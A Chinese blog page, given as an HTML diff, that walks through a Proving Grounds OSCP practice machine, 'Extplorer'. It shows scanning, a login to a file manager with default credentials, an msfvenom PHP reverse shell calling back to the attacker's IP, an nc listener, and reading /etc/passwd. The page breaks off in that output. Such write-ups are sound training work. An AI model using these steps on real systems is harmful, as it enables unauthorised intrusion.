@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="baidu-site-verification" content="codeva-l4PbCwKc7Z">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="FEUc84rh7dgaXl_JOY_Bq7sulvZljH">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monaco:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.thiiiiink.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Proving Grounds Practice Lab中Extplorer打靶过程记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Proving Grounds Practice - Extplorer">
+<meta property="og:url" content="https://www.thiiiiink.com/post/20250216172300.html">
+<meta property="og:site_name" content="临渊羡鱼">
+<meta property="og:description" content="Proving Grounds Practice Lab中Extplorer打靶过程记录">
+<meta property="og:locale">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-55.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-57.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-58.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-56.png.png">
+<meta property="article:published_time" content="2025-02-16T09:23:00.000Z">
+<meta property="article:modified_time" content="2025-09-30T08:00:49.622Z">
+<meta property="article:author" content="Yiaos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thiiiiink.com/202508/asynccode-55.png.png">
+
+<link rel="canonical" href="https://www.thiiiiink.com/post/20250216172300.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Proving Grounds Practice - Extplorer | 临渊羡鱼</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-J67WGCEZY5"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-J67WGCEZY5');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?257c5564d6a2b53ffc355cd89f5f2095";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">临渊羡鱼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">退而结网</p>
+      <a>
+        <img class="custom-logo-image" src="/images/avatar.gif" alt="临渊羡鱼">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://www.thiiiiink.com/post/20250216172300.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yiaos">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临渊羡鱼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Proving Grounds Practice - Extplorer
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-02-16 17:23:00" itemprop="dateCreated datePublished" datetime="2025-02-16T17:23:00+08:00">2025-02-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-30 16:00:49" itemprop="dateModified" datetime="2025-09-30T16:00:49+08:00">2025-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/" itemprop="url" rel="index"><span itemprop="name">What We Do-三天打鱼</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/" itemprop="url" rel="index"><span itemprop="name">OSCP</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/" itemprop="url" rel="index"><span itemprop="name">PG Lab</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">Proving Grounds Practice Lab中Extplorer打靶过程记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Difficuty"><a href="#Difficuty" class="headerlink" title="Difficuty"></a>Difficuty</h1><p>Midum</p>
+<h1 id="scans"><a href="#scans" class="headerlink" title="scans"></a>scans</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> ssh found on tcp/<span class="number">22.</span></span><br><span class="line">    OpenSSH <span class="number">8.2</span>p1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> http found on tcp/<span class="number">80.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br></pre></td></tr></table></figure>
+
+<h1 id="80-wordpress"><a href="#80-wordpress" class="headerlink" title="80 wordpress"></a>80 wordpress</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.212.16:80 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">321</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-content/]</span></span><br><span class="line">/wordpress            (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">320</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wordpress/]</span></span><br><span class="line">/wp-includes          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/]</span></span><br><span class="line">/wp-admin             (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">319</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/]</span></span><br></pre></td></tr></table></figure>
+
+<p>wpscan 确认版本6.2， 没扫描到插件</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http<span class="punctuation">:</span><span class="comment">//192.168.212.16 -v</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__<span class="punctuation">,</span>_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version <span class="number">3.8</span><span class="number">.27</span></span><br><span class="line">       Sponsored by Automattic - https<span class="punctuation">:</span><span class="comment">//automattic.com/</span></span><br><span class="line">       @_WPScan_<span class="punctuation">,</span> @ethicalhack3r<span class="punctuation">,</span> @erwan_lr<span class="punctuation">,</span> @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> URL<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/ [192.168.212.16]</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Effective URL<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/setup-config.php</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Started<span class="punctuation">:</span> Sat Feb <span class="number">15</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">15</span><span class="punctuation">:</span><span class="number">32</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">Interesting Finding(s)<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Headers</span><br><span class="line"> | Interesting Entry<span class="punctuation">:</span> Server<span class="punctuation">:</span> Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br><span class="line"> | Found By<span class="punctuation">:</span> Headers (Passive Detection)</span><br><span class="line"> | Confidence<span class="punctuation">:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> WordPress readme found<span class="punctuation">:</span> http<span class="punctuation">:</span><span class="comment">//192.168.212.16/readme.html</span></span><br><span class="line"> | Found By<span class="punctuation">:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence<span class="punctuation">:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> WordPress version <span class="number">6.2</span> identified (Insecure<span class="punctuation">,</span> released on <span class="number">2023</span><span class="number">-03</span><span class="number">-29</span>).</span><br><span class="line"> | Found By<span class="punctuation">:</span> Most Common Wp Includes Query Parameter In Homepage (Passive Detection)</span><br><span class="line"> |  - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/css/dashicons.min.css?ver=6.2</span></span><br><span class="line"> | Confirmed By<span class="punctuation">:</span></span><br><span class="line"> |  Common Wp Includes Query Parameter In Homepage (Passive Detection)</span><br><span class="line"> |   - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/css/buttons.min.css?ver=6.2</span></span><br><span class="line"> |  Style Etag (Aggressive Detection)</span><br><span class="line"> |   - http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/load-styles.php, Match: &#x27;6.2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> The main theme could not be detected.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> No plugins Found.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">08</span> &lt;=================================================================&gt; (<span class="number">137</span> / <span class="number">137</span>) <span class="number">100.00</span>% Time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">00</span><span class="punctuation">:</span><span class="number">08</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>i<span class="punctuation">]</span> No Config Backups Found.</span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> No WPScan API Token given<span class="punctuation">,</span> as a result vulnerability data has not been output.</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> You can get a free API token with <span class="number">25</span> daily requests by registering at https<span class="punctuation">:</span><span class="comment">//wpscan.com/register</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Finished<span class="punctuation">:</span> Sat Feb <span class="number">15</span> <span class="number">23</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">:</span><span class="number">51</span> <span class="number">2025</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Requests Done<span class="punctuation">:</span> <span class="number">169</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Cached Requests<span class="punctuation">:</span> <span class="number">5</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Data Sent<span class="punctuation">:</span> <span class="number">35.328</span> KB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Data Received<span class="punctuation">:</span> <span class="number">42.482</span> KB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Memory used<span class="punctuation">:</span> <span class="number">208.801</span> MB</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Elapsed time<span class="punctuation">:</span> <span class="number">00</span><span class="punctuation">:</span><span class="number">01</span><span class="punctuation">:</span><span class="number">18</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://thiiiiink.com/202508/asynccode-55.png.png"></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-57.png.png"></p>
+<p>测试默认账号密码都没有结果</p>
+<h1 id="foodhold"><a href="#foodhold" class="headerlink" title="foodhold"></a>foodhold</h1><p>gobuster扫到目录filemanager</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w /usr/share<span class="comment">//wordlists/dirb/common.txt -u http://192.168.212.16:80 -t 40</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3<span class="number">.6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Url<span class="punctuation">:</span>                     http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Method<span class="punctuation">:</span>                  GET</span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Threads<span class="punctuation">:</span>                 <span class="number">40</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Wordlist<span class="punctuation">:</span>                /usr/share<span class="comment">//wordlists/dirb/common.txt</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Negative Status codes<span class="punctuation">:</span>   <span class="number">404</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> User Agent<span class="punctuation">:</span>              gobuster/<span class="number">3.6</span></span><br><span class="line"><span class="punctuation">[</span>+<span class="punctuation">]</span> Timeout<span class="punctuation">:</span>                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess            (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/.htpasswd            (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/.hta                 (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/filemanager          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/filemanager/]</span></span><br><span class="line">/index.php            (Status<span class="punctuation">:</span> <span class="number">302</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80/wp-admin/setup-config.php]</span></span><br><span class="line">/server-status        (Status<span class="punctuation">:</span> <span class="number">403</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">279</span><span class="punctuation">]</span></span><br><span class="line">/wordpress            (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">320</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wordpress/]</span></span><br><span class="line">/wp-admin             (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">319</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-admin/]</span></span><br><span class="line">/wp-content           (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">321</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-content/]</span></span><br><span class="line">/wp-includes          (Status<span class="punctuation">:</span> <span class="number">301</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">322</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16/wp-includes/]</span></span><br><span class="line">/xmlrpc.php           (Status<span class="punctuation">:</span> <span class="number">302</span>) <span class="punctuation">[</span>Size<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">]</span> <span class="punctuation">[</span>--&gt; http<span class="punctuation">:</span><span class="comment">//192.168.212.16:80/wp-admin/setup-config.php]</span></span><br><span class="line">Progress<span class="punctuation">:</span> <span class="number">4614</span> / <span class="number">4615</span> (<span class="number">99.98</span>%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>使用admin:admin可以登录，并且有上传文件权限，<code>msfvenom -p php/reverse_php LHOST=192.168.45.184 LPORT=4444 -f raw -o shell.php</code> 生成webshell上传，curl ip:port&#x2F;filemanager&#x2F;shell.php 得到shell</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-58.png.png"></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-56.png.png"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nvlp <span class="number">4444</span></span><br><span class="line">listening on <span class="punctuation">[</span>any<span class="punctuation">]</span> <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.45</span><span class="number">.234</span><span class="punctuation">]</span> from (UNKNOWN) <span class="punctuation">[</span><span class="number">192.168</span><span class="number">.212</span><span class="number">.16</span><span class="punctuation">]</span> <span class="number">57546</span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span>root<span class="punctuation">:</span>/root<span class="punctuation">:</span>/bin/bash</span><br><span class="line">daemon<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span>daemon<span class="punctuation">:</span>/usr/sbin<span class="punctuation">:</span>/usr/sbin/nologin</span><br><span class="line">bin<span class="punctuation">:</span>x<span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span>bin<span 